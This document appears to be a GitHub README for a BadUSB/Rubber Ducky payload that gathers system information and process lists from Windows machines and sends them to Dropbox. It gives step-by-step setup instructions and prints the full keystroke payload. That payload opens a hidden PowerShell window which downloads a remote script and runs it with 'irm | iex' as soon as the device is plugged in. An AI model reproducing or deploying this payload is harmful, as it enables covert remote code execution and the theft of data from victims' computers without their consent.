# SysInfoEXFIL - BADUSB ✅

\
**Category**:  Exfiltration 

## Description

A script used to get system information and processes list then exfiltrates to dropbox.

### Dependencies
> [!NOTE]\
> <b>You will need a [Dropbox API token](https://www.dropbox.com/developers/) for this script, so you will have to change "your-token-here" in the ps1 script for this to work!</b>

* Internet Connection
* Windows
* Dropbox

### Executing program

* Plug in your device

### Settings

* Open **SysInfoEXFIL.ps1** and edit `$dropboxToken = "your-token-here"`.
* Replace `your-token-here` with your token.
* Then go to your github and upload your modified **SysInfoEXFIL.ps1** to it
* Once uploaded copy the raw link, it should look like this:
\
  `https://raw.githubusercontent.com/Kexx0/usb-rubber/refs/heads/main/SysInfoEXFIL/SysInfoEXFIL.ps1`
* Then open **payload.txt**
  It should look like this

```bash
DEFINE #LINK your-direct-link

GUI r
DELAY 500
STRING powershell.exe -WindowStyle Hidden -Command "irm '#LINK' | iex"
ENTER
```
Replace **your-direct-link** with the link you've copied in the previous step.

Then encode your new payload.txt using [Hak5 Payload Studio](https://payloadstudio.com/community/)

Put the **inject.bin** file on your Rubber Ducky.  
You're done!
 


## Credits
kex
